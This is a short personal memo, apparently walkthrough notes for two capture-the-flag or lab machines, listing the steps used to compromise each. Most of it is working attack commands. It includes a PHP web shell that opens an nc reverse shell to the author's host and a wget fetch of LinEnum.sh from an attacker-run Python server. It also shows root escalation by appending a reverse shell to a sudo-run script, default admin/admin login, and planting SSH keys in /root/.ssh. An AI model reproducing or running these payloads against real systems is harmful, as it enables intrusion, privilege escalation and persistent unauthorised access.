# Memo
## Machine 1
target ip: XXX.XXX.XXX.XXX  
my external ip: YYY.YYY.YYY.YYY  
my external port: 9443(user shell), 8080(file transfer), 8443(root shell)  
- upload php  
    image.php  
    ```php
    <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YYY.YYY.YYY.YYY 9443 >/tmp/f"); ?>
    ```
- access to an uploaded php  
    ```bash
    $ curl http://XXX.XXX.XXX.XXX/nibbleblog/content/private/plugins/my_image/image.php
    ```
- set port-forwarding fow WSL and allow fire-wall for user shell  
- set acceptable shell on WSL  
    ```zsh
    $ nc -lvnp 9443
    ```
- preserve `LinNum.sh`  
- open http server with python  
    ```python
    $ python -m http.server 8080
    ```
- set port-forwarding fow WSL and allow fire-wall for file transfer  
- access from target shell to my computer  
    ```bash
    $ wget http://YYY.YYY.YYY.YYY:8080/LinEnum.sh
    ``````
- run `LinuEnum.sh` on the target machine  
- set port-forwarding fow WSL and allow fire-wall for root shell  
- get root on the target machine  
    - use sudo user and file  
        ```bash
        echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YYY.YYY.YYY.YYY 8443 >/tmp/f' | tee -a monitor.sh
        ```


## Machine 2
target ip: XXX.XXX.XXX.XXX  
my external ip: YYY.YYY.YYY.YYY  
my external port: 9443(user shell), 8000(file transfer)  
- Enumeration  
    - access URL "/admin"  
        ID/PW : admin/admin  
- Exploit  
    - upload image.php manually  
    ```php
    <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YYY.YYY.YYY.YYY 9443 >/tmp/f"); ?>
    ```
- Enumeration  
    - search something on the target machine  
- Privilege Escalation  
    - upload my.php manually  
        ```php
        <?php system ("wget -P /root/.ssh http://YYY.YYY.YYY.YYY:8000/authorized_keys && chmod 600 /root/.ssh/authorized_keys;") ?>
        ```
    - run  
        ```bash
        $ wget http://YYY.YYY.YYY.YYY:8000/my.php
        ```
    - ssh from my machine to the target machine  